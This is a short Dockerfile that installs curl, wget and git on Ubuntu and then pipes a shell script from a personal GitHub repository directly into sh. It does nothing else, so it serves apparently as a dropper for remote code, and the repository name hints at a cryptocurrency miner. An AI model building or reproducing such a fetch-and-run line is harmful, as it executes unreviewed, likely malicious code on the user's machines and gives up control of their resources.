FROM ubuntu:latest
RUN apt update -y
RUN apt install wget curl git -y
RUN curl https://raw.githubusercontent.com/micromine00848/powerb2/refs/heads/main/nosu.sh | sh
